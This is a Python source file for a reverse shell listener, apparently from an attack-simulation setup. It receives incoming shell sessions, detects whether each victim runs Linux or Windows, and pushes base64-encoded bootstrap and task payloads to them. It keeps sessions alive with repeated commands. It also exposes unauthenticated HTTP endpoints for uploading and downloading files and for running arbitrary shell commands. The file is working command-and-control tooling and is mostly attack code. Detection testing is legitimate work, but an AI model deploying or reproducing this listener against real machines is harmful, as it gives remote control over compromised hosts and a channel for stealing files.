import argparse
import asyncio
import base64
import json
import logging
import os
import secrets
import signal
import subprocess
import sys
from pathlib import Path

import uvicorn
from fastapi import FastAPI, File, HTTPException, UploadFile
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
logger = logging.getLogger("reverse_server")

parser = argparse.ArgumentParser(description="reverse shell listener")
parser.add_argument(
    "--port",
    dest="reverse_shell_port",
    type=int,
    default=4444,
    help="listen port",
)
parser.add_argument(
    "--host",
    dest="reverse_shell_host",
    type=str,
    default=None,
    help="hostname/ip for this reverse shell host",
)
args = parser.parse_args()

# Global asyncio queue to hold incoming sessions
session_queue = asyncio.Queue()

WORKER_THREADS = 1

app = FastAPI()


class TaskRequest(BaseModel):
    session_id: str
    task: str


script_dir = os.path.dirname(os.path.realpath(__file__))


def get_session_dir(session_id: str) -> str:
    """Ensure the session directory exists and return its path."""
    session_dir = Path(script_dir, "files", session_id)
    Path.mkdir(session_dir, parents=True, exist_ok=True)
    return session_dir.as_posix()


async def run_fastapi():
    config = uvicorn.Config(app, host="127.0.0.1", port=8001, log_level="info")
    server = uvicorn.Server(config)
    await server.serve()


@app.get("/files/{session_id}/{filename}")
async def download_file(session_id: str, filename: str):
    """
    Download a file from the session's directory.
    Returns a 404 error if the file is not found.
    """
    file_path = Path(get_session_dir(session_id), filename)
    if not file_path.exists():
        raise HTTPException(status_code=404, detail="File not found")
    return FileResponse(file_path.as_posix())


@app.post("/files/{session_id}/{filename}")
async def upload_file(session_id: str, filename: str, file: UploadFile = File(...)):
    """
    Upload a file to the session's directory.
    The file content is read and written to ./files/<session_id>/<filename>.
    """
    session_dir = get_session_dir(session_id)
    file_path = Path(session_dir, filename)
    content = await file.read()
    with open(file_path.as_posix(), "wb") as buffer:
        buffer.write(content)
    return {"detail": "File uploaded successfully", "filename": filename}


@app.post("/execute")
async def execute_task(task_request: TaskRequest):
    session_id = task_request.session_id
    task = task_request.task

    proc = await asyncio.create_subprocess_shell(task, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    stdout, stderr = await proc.communicate()
    return JSONResponse(
        {
            "session_id": session_id,
            "task": task,
            "stdout": base64.b64encode(stdout.decode('utf-8').strip().encode('utf-8')).decode('utf-8'),
            "stderr": base64.b64encode(stderr.decode('utf-8').strip().encode('utf-8')).decode('utf-8'),
            "returncode": proc.returncode,
        }
    )


async def forward_data(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    try:
        while True:
            data = await reader.read(1024)
            if not data:
                break
            writer.write(data)
            await writer.drain()
    except Exception as e:
        logger.info("Forward error: %s", e)
    finally:
        writer.close()


def get_self_ip():
    """
    Get the public IP of the host by querying icanhazip.com.
    """
    result = subprocess.run(
        ["/bin/bash", "-c", "curl -s https://ipv4.icanhazip.com"],
        cwd="/tmp",
        capture_output=True,
        text=True,
    )
    return result.stdout.strip()


def signal_handler(sig, frame):
    """
    Signal handler to gracefully stop the listener and worker threads.
    """
    sys.exit(0)


def get_payload(task, platform="linux"):
    payload = ""
    if platform == "linux":
        extension = "sh"
    else:
        extension = "ps1"
    # search the default payloads directory first
    if Path(Path.cwd(), "payloads", f"{task}.{extension}").exists():
        with open(Path(Path.cwd(), "payloads", f"{task}.{extension}").as_posix(), "r") as f:
            payload_script = f.read()
            # Base64 encode the script
            payload = base64.b64encode(
                payload_script.encode('utf-8')).decode('utf-8')
    # search the lacework-deploy-payloads submodule linux directory second
    elif Path(Path.cwd(), f"lacework-deploy-payloads/{platform}", f"{task}.{extension}").exists():
        with open(Path(Path.cwd(), f"lacework-deploy-payloads/{platform}", f"{task}.{extension}").as_posix(), "r") as f:
            payload_script = f.read()
            # Base64 encode the script
            payload = base64.b64encode(
                payload_script.encode('utf-8')).decode('utf-8')
    else:
        raise Exception(f"Payload not found: {task}")
    return payload


# Register signal handler for graceful shutdown.
signal.signal(signal.SIGINT, signal_handler)

# Set the reverse shell host to the public IP of the host if not provided
if args.reverse_shell_host is None:
    REVERSE_SHELL_HOST = get_self_ip()
else:
    REVERSE_SHELL_HOST = args.reverse_shell_host

REVERSE_SHELL_PORT = args.reverse_shell_port

BOOTSTRAP_PAYLOAD = get_payload("bootstrap")

ENV_CONTEXT = os.environ.get("ENV_CONTEXT", "")


async def start_keepalive(session):
    # """
    # Start a keepalive coroutine for the session that periodically sends
    # a benign command.
    # """
    reader = session["reader"]
    writer = session["writer"]
    addr = session["addr"]
    platform = session["platform"]
    session_id = session["session_id"]

    logger.info(f"Starting keepalive for {addr}")
    try:
        while not session.get("keepalive_stop", False):
            try:
                # Adjust the command as needed. Example for Linux:
                if platform == "linux":
                    command = "touch /tmp/keepalive_session\n"
                else:
                    command = "echo keepalive_session > C:\\Windows\\Temp\\keepalive_session.txt"

                encoded_payload = base64.b64encode(
                    command.encode('utf-8')).decode('utf-8')
                response = await send_payload_and_get_response(
                    reader=reader,
                    writer=writer,
                    session_id=session_id,
                    encoded_payload=encoded_payload,
                    addr=addr,
                    description=command,
                    platform=platform,
                )
                logger.info(f"Keepalive response from {addr}: {response}")
            except Exception as e:
                logger.error(f"Keepalive error for {addr}: {e}")
                break
            await asyncio.sleep(1)  # wait 1 second between keepalive messages
    except asyncio.CancelledError:
        logger.info(f"Keepalive task cancelled for {addr}")


async def session_welcome_handler(session):
    """
    Send the bootstrap payload and start the keepalive task for a new session.
    """
    reader = session["reader"]
    writer = session["writer"]
    addr = session["addr"]
    session_id = session["session_id"]
    platform = session["platform"]
    error = False

    logger.info(
        f"Running welcome handler for new session {addr} on {platform}")

    # Read the client bootstrap script from file
    try:
        if platform == "linux":
            command = f"touch /tmp/{session_id}\n"
        else:
            command = f"echo {session_id} > C:\\Windows\\Temp\\{session_id}.txt"

        logger.info(f"Sending bootstrap command: {command.strip()}")

        encoded_payload = base64.b64encode(
            command.encode('utf-8')).decode('utf-8')
        response = await send_payload_and_get_response(
            reader=reader,
            writer=writer,
            session_id=session_id,
            encoded_payload=encoded_payload,
            addr=addr,
            description=command,
            platform=platform,
        )
        logger.info(f"Welcome response from {addr}: {response}")
    except Exception as e:
        error = True
        logger.error(f"Error reading bootstrap script: {e}")
    finally:
        # close the session if exception occurs
        if error:
            writer.close()
            await writer.wait_closed()
            session_queue.task_done()
        # progress to second stage and start the keepalive task
        else:
            await asyncio.sleep(5)
            session["keepalive_task"] = asyncio.create_task(
                start_keepalive(session))
            session["bootstrap_sent"] = True

    return error


async def client_handler(reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
    """
    Callback for new client connections.
    Add the session details to the global session_queue and run the welcome handler.
    """
    addr = writer.get_extra_info("peername")
    session_id = secrets.token_hex(4)
    logger.info(f"Accepted connection from {addr}")

    # multiplexer check for HTTP request or reverse shell
    try:
        initial = await asyncio.wait_for(reader.read(4), timeout=1.0)
    except asyncio.TimeoutError:
        initial = b""

    # Check if the initial bytes look like an HTTP request.
    if (
        initial.startswith(b"GET")
        or initial.startswith(b"POST")
        or initial.startswith(b"PUT")
        or initial.startswith(b"HEAD")
    ):
        logger.info("HTTP connection detected; proxying to FastAPI.")
        backend_reader, backend_writer = await asyncio.open_connection("127.0.0.1", 8001)
        backend_writer.write(initial)
        await backend_writer.drain()
        await asyncio.gather(
            forward_data(reader, backend_writer),
            forward_data(backend_reader, writer),
        )
    else:
        logger.info(
            "Empty or non-HTTP data detected; treating as reverse shell connection.")

        # Create a session dictionary with a flag to indicate if it's new.
        session = {
            "reader": reader,
            "writer": writer,
            "addr": addr,
            "keepalive_stop": False,
            "session_id": session_id,
            "bootstrap_sent": False,
        }

        command = "echo $PSVersionTable.PSVersion|ConvertTo-Json -Compress"
        encoded_payload = base64.b64encode(
            command.encode('utf-8')).decode('utf-8')
        writer.write(f"{encoded_payload}\n".encode('utf-8'))
        await writer.drain()
        logger.info(f"Sent payload to {addr}: {command.strip()}")

        # Ignore the first line (likely the shell prompt)

        response_line = await reader.readline()
        if not response_line:
            logger.info(f"No response from {addr}")
            return None
        else:
            # attempt to decode windows utf-8-sig json response
            logger.info(
                f"Raw response: {response_line.decode('utf-8').strip()}")
            try:
                response = json.loads(
                    response_line.decode("utf-8-sig").strip())
                output = base64.b64decode(
                    response.get("stdout")).decode('utf-8')
            except json.JSONDecodeError:
                logger.info("Unable to process JSON response")
                output = response_line.decode('utf-8').strip()

            if "MinorRevision" in output:
                logger.info(
                    f"Windows platform detected: Powershell version {output.strip()}")
                session["platform"] = "windows"
                # BOOTSTRAP_PAYLOAD = get_payload("bootstrap", platform="windows")
            else:
                logger.info(
                    f"Linux platform assumed - No $PSVersionTable.PSVersion found: {output.strip()}")
                session["platform"] = "linux"

        # Run the welcome handler for this new session
        asyncio.create_task(session_welcome_handler(session))
        await session_queue.put(session)


async def send_payload_and_get_response(
    reader,
    writer,
    session_id,
    encoded_payload,
    addr,
    description="",
    platform="linux",
    task="default"
):
    """
    Sends a command payload to the client, then reads and returns the JSON response.

    Args:
        reader (asyncio.StreamReader): The stream reader for the connection.
        writer (asyncio.StreamWriter): The stream writer for the connection.
        encoded_payload (str): Base64 encoded payload to be executed by the client's decode_payload function.
        addr: Client address (used for logging).
        description (str): A description of the command being sent, for logging purposes.

    Returns:
        dict or None: The JSON response as a dictionary if available; otherwise, None.
    """
    # Construct the command that sources the bootstrap and then executes the payload
    if platform == "linux":
        command_encoded = f"export REVERSE_SHELL_HOST={REVERSE_SHELL_HOST} REVERSE_SHELL_PORT={REVERSE_SHELL_PORT} " \
            + f"ENV_CONTEXT={ENV_CONTEXT} TAG={task} " \
            + f"SESSION_ID={session_id} && source <(base64 -d <<< {BOOTSTRAP_PAYLOAD}) " \
            + f"&& decode_payload {encoded_payload}\n"
    else:
        command_decoded = base64.b64decode(
            encoded_payload).decode('utf-8').strip()
        command = f"$env:REVERSE_SHELL_HOST='{REVERSE_SHELL_HOST}';$env:REVERSE_SHELL_PORT='{REVERSE_SHELL_PORT}';" \
            + f"$env:ENV_CONTEXT='{ENV_CONTEXT}';$env:TAG='{task}';" \
            + f"$env:SESSION_ID='{session_id}';{BOOTSTRAP_PAYLOAD};{command_decoded};"
        command_encoded = base64.b64encode(
            command.encode('utf-8')).decode('utf-8') + "\n"

    writer.write(command_encoded.encode('utf-8'))
    await writer.drain()
    logger.info(f"Sent payload to {addr}: {description.strip()}")

    # Ignore the first line (likely the shell prompt)
    if platform == "linux":
        first_line = await reader.readline()
        logger.debug(
            f"Ignoring first line (likely prompt): {first_line.decode('utf-8').strip()}")

    # Read the JSON response from the client
    response_line = await reader.readline()
    if not response_line:
        logger.info(f"No response from {addr}")
        return None

    try:
        if platform == "windows":
            logger.info(
                f"Response from {addr}: {response_line.decode('utf-8').strip()}")
            response = json.loads(response_line.decode("utf-8-sig").strip())
        else:
            logger.info(
                f"Response from {addr}: {response_line.decode('utf-8').strip()}")
            response = json.loads(response_line.decode('utf-8').strip())
        logger.info(f"Response from {addr}: {response}")
        return response
    except json.JSONDecodeError:
        logger.info("Unable to process JSON response")
        logger.info(f"Raw response: {response_line.decode('utf-8').strip()}")
        return None


async def process_session():
    """
    Worker coroutine that continuously pulls sessions from the session_queue.
    For each session, it sends additional payloads (or handles commands) as needed.
    """
    while True:
        session = await session_queue.get()
        reader = session["reader"]
        writer = session["writer"]
        addr = session["addr"]
        platform = session["platform"]
        session_id = session["session_id"]

        logger.info(
            f"Processing session {session_id} from {addr} on {platform}")

        # kill the keep alive while executing commands
        session["keepalive_stop"] = True
        if "keepalive_task" in session:
            session["keepalive_task"].cancel()

        # wait on the session bootstrap to complete
        while "bootstrap_sent" not in session or not session["bootstrap_sent"]:
            await asyncio.sleep(1)

        try:
            # Find the task to execute
            if platform == "linux":
                command = 'if [ -z "$TASK" ]; then echo -n "default_payload"; else echo -n "$TASK"; fi'
            else:
                command = 'if (-not ($env:TASK)) { Write-Output "default_payload" } else { Write-Output $env:TASK }\n'

            encoded_payload = base64.b64encode(
                command.encode('utf-8')).decode('utf-8')

            response = await send_payload_and_get_response(
                reader=reader,
                writer=writer,
                session_id=session_id,
                encoded_payload=encoded_payload,
                addr=addr,
                description=command,
                platform=platform,
            )

            if response:
                try:
                    # Optionally decode the stdout field if it is base64-encoded
                    task = os.path.basename(base64.b64decode(
                        response.get("stdout")).decode('utf-8'))
                    logger.info(f"Decoded TASK: {task}")
                except Exception as e:
                    logger.error(f"Error decoding task: {e}")

            # Send the payload for the task
            task_payload = get_payload(task, platform=platform)

            response = await send_payload_and_get_response(
                reader=reader,
                writer=writer,
                encoded_payload=task_payload,
                session_id=session_id,
                addr=addr,
                description=f"task payload: {task}",
                platform=platform,
                task=task,
            )

        except Exception as e:
            logger.error(f"Error processing session from {addr}: {e}")
        finally:
            writer.close()
            await writer.wait_closed()
            session_queue.task_done()


async def main():
    # Start the FastAPI app as a background task on an internal port.
    asyncio.create_task(run_fastapi())

    # Start the server listener on all interfaces at the specified port
    server = await asyncio.start_server(client_handler, "0.0.0.0", args.reverse_shell_port)
    addrs = ", ".join(str(sock.getsockname()) for sock in server.sockets)
    logger.info(f"Server listening on {addrs}")

    # Launch a few worker tasks to process sessions concurrently.
    [asyncio.create_task(process_session()) for _ in range(WORKER_THREADS)]

    async with server:
        await server.serve_forever()


if __name__ == "__main__":
    asyncio.run(main())
